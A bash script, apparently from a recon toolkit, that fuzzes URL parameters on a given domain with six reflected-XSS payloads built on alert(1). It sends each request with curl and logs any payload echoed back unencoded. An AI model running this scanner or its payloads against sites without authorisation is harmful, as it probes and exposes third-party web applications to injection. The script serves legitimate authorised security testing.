#!/usr/bin/env bash
TARGET="${1:-}"
OUTDIR="${2:-recon/$TARGET}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <domain> <recon_dir>"
  exit 1
fi

echo "[*] XSS Fuzzer — testing parameters..."
FINDINGS="$OUTDIR/xss_fuzzer_findings.txt"
touch "$FINDINGS"

PAYLOADS=(
  "<script>alert(1)</script>"
  "'\"><script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "javascript:alert(1)"
  "<svg onload=alert(1)>"
  "'\"><img src=x onerror=alert(1)>"
)

COUNT=0
HITS=0

while read -r url; do
  params=$(echo "$url" | grep -oP '(?<=\?).*' | tr '&' '\n' | cut -d= -f1)
  [[ -z "$params" ]] && continue

  for param in $params; do
    for payload in "${PAYLOADS[@]}"; do
      encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
      test_url=$(echo "$url" | sed "s|\($param=\)[^&]*|\1$encoded|")

      response=$(curl -sk "$test_url" --max-time 8 \
        -H "User-Agent: Mozilla/5.0" 2>/dev/null || true)

      COUNT=$((COUNT + 1))

      # Check if payload reflected unencoded
      if echo "$response" | grep -qF "$payload"; then
        echo "[!] XSS REFLECTED on $param"
        echo "[!] Payload : $payload"
        echo "[!] URL     : $test_url"
        echo "XSS_REFLECTED: $test_url | param=$param | payload=$payload" >> "$FINDINGS"
        HITS=$((HITS + 1))
      fi
    done
  done

done < <(grep "?" "$OUTDIR/xss-candidates.txt" 2>/dev/null | head -50)

echo ""
echo "[*] XSS Fuzzer complete"
echo "[*] Params tested : $COUNT"
echo "[*] Reflected hits: $HITS"
echo "[*] Results       : $FINDINGS"
